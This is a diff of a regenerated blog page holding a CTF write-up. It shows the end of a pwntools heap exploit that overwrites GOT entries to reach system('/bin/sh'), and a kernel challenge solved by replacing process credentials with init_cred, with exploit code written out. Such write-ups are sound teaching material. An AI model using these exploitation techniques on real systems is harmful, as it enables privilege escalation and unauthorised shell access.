+<span class="n">binary_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
 <span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">binary_leak</span> <span class="o">-</span> <span class="mh">0x3594</span>
 
-<span class="n">clear</span><span class="p">()</span>
+<span class="nf">clear</span><span class="p">()</span>
 
-<span class="n">a</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'1234'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test1'</span><span class="p">)</span>
-<span class="n">b</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'4321'</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="nb">exit</span><span class="p">))</span>
-<span class="n">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">1234</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">test1</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">b</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">4321</span><span class="sh">'</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="nb">exit</span><span class="p">))</span>
+<span class="nf">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">c</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x08</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hack'</span><span class="p">)</span>
-<span class="n">show</span><span class="p">(</span><span class="sa">b</span><span class="s">''</span><span class="p">)</span>
-<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">c</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x08</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">hack</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">show</span><span class="p">(</span><span class="sa">b</span><span class="sh">''</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
 <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="nb">exit</span>
 
-<span class="n">clear</span><span class="p">()</span>
+<span class="nf">clear</span><span class="p">()</span>
 
-<span class="n">a</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'1234'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'test1'</span><span class="p">)</span>
-<span class="n">b</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'4321'</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">strlen</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
-<span class="n">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">1234</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">test1</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">b</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">4321</span><span class="sh">'</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">strlen</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+<span class="nf">delete</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
 
-<span class="n">c</span> <span class="o">=</span> <span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x60</span><span class="s">'</span><span class="p">,</span> <span class="sa">b</span><span class="s">'hack'</span><span class="p">)</span>
+<span class="n">c</span> <span class="o">=</span> <span class="nf">add</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x60</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">hack</span><span class="sh">'</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-    <span class="n">edit</span><span class="p">(</span><span class="n">p32</span><span class="p">((</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x18b660</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="nf">p32</span><span class="p">((</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x18b660</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="nf">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>
 
 <span class="k">else</span><span class="p">:</span> 
-    <span class="n">edit</span><span class="p">(</span><span class="n">p32</span><span class="p">((</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xb4d30</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="nf">p32</span><span class="p">((</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xb4d30</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">),</span> <span class="nf">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt;&gt; '</span><span class="p">,</span> <span class="s">'/bin/sh'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt; </span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>Flag: <code class="language-plaintext highlighter-rouge">ACSC{PWN_1S_FUN_5W33T_D3liC1ous :)}</code></p>
 
 <h1 id="sysnote---400-pts---5-solves">sysnote - 400 pts - 5 solves</h1>
 <p>This is a kernel pwn challenge. Some syscalls are added into kernel. This was special for me because I recently learned some kernel pwning techniques and this was my first time solving a kernel challenges during a CTF. I will skip some beginner stuff here, for that checkout my <a href="/kernel-pwn/2021/09/10/pass-grabcon.html">writeup</a> for a kernel challenge.<br />
 Code for the syscalls is below:</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;linux/kernel.h&gt;
-#include &lt;linux/syscalls.h&gt;
-#include &lt;linux/compiler.h&gt;
-#include &lt;linux/export.h&gt;
-#include &lt;linux/fault-inject-usercopy.h&gt;
-#include &lt;linux/kasan-checks.h&gt;
-#include &lt;linux/thread_info.h&gt;
-#include &lt;linux/uaccess.h&gt;
-#include &lt;linux/kernel.h&gt;
-#include &lt;linux/errno.h&gt;
-#include &lt;linux/mm.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/syscalls.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/compiler.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/export.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fault-inject-usercopy.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/kasan-checks.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/thread_info.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/mm.h&gt;</span><span class="cp">
 </span>
 <span class="cp">#define MAX_LENGTH 4096
 </span>
@@ -810,9 +810,9 @@ Code for the syscalls is below:</p>
 <span class="p">}</span>
 </code></pre></div></div>
 <p>Looking at the code reveals that these syscalls deal with current <code class="language-plaintext highlighter-rouge">task_struct</code> and its member <code class="language-plaintext highlighter-rouge">note</code>. <code class="language-plaintext highlighter-rouge">note</code> is not a member of <code class="language-plaintext highlighter-rouge">task_struct</code> in the actual kernel, it was added in <code class="language-plaintext highlighter-rouge">k.patch</code> file just before the <code class="language-plaintext highlighter-rouge">cred struct</code>s of the current process.</p>
-<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">[redacted]</span>
-diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl
-<span class="gh">index ce18119ea0d0..5c4421684aa3 100644
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[redacted]
+<span class="gh">diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl
+index ce18119ea0d0..5c4421684aa3 100644
 </span><span class="gd">--- a/arch/x86/entry/syscalls/syscall_64.tbl
 </span><span class="gi">+++ b/arch/x86/entry/syscalls/syscall_64.tbl
 </span><span class="p">@@ -413,3 +413,9 @@</span>
@@ -825,7 +825,7 @@ diff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/sy
 +550	64	show_note			sys_show_note
 +551	64	copy_note			sys_copy_note
 +552    64  current_addr        sys_current_addr
-</span><span class="err">\</span> No newline at end of file
+</span>\ No newline at end of file
 <span class="gh">diff --git a/include/linux/sched.h b/include/linux/sched.h
 index 32813c345115..2b74ab806a32 100644
 </span><span class="gd">--- a/include/linux/sched.h
@@ -839,7 +839,7 @@ index 32813c345115..2b74ab806a32 100644
 </span> 	/* Process credentials: */
  
  	/* Tracer's credentials at attach: */
-<span class="err">[redacted]</span>
+[redacted]
 </code></pre></div></div>
 <p>We also get the syscall numbers for the new syscalls. Following is an overview of each syscall:</p>
 <ul>
@@ -865,13 +865,13 @@ I was stuck here for a long time then I decided to overwrite <code class="langua
 After getting the pointer, I replaced <code class="language-plaintext highlighter-rouge">real_cred</code> and <code class="language-plaintext highlighter-rouge">cred</code> with <code class="language-plaintext highlighter-rouge">init_cred</code> and spawned a shell.<br />
 You just have to be careful about not printing anything before repairing <code class="language-plaintext highlighter-rouge">cred</code> because <code class="language-plaintext highlighter-rouge">write</code> syscall does some checks which are done using <code class="language-plaintext highlighter-rouge">selinux_file_permission</code> which are based on <code class="language-plaintext highlighter-rouge">cred</code>, having an invalid pointer will make the kernel panic.<br />
 Final exploit:</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;syscall.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;syscall.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span>
 <span class="cp">#define ADD_NOTE     548
 #define DEL_NOTE     549
@@ -971,7 +971,7 @@ If you have any question, hit me on discord <code class="language-plaintext high
 			 
 				<li>
 					<a href="/tags.html#kernel-ref">
-					kernel <span>(3)</span>
+					kernel <span>(4)</span>
 					,
 					</a>
 				</li>
@@ -1045,7 +1045,7 @@ If you have any question, hit me on discord <code class="language-plaintext high
 		  <li class="previous"><a href="/kernel-pwn/2021/09/10/pass-grabcon.html" title="GrabCON 2021 - Paas">&larr; Previous</a></li>
 		  
 		  
-		  <li class="next"><a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html" title="HacktivityCTF 2021 pawn shop challenge writeup">Next &rarr;</a></li>
+		  <li class="next"><a href="/writeup/2021/09/28/HacktivityCTF2021-pawn-shop.html" title="HacktivityCTF 2021 - Pawn Shop">Next &rarr;</a></li>
 		  
 		</ul>
 
@@ -1065,7 +1065,7 @@ If you have any question, hit me on discord <code class="language-plaintext high
 		<footer>
 			<hr/>
 			<p>
-				&copy; 2022 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
 			</p>
 		</footer>
 	</div>
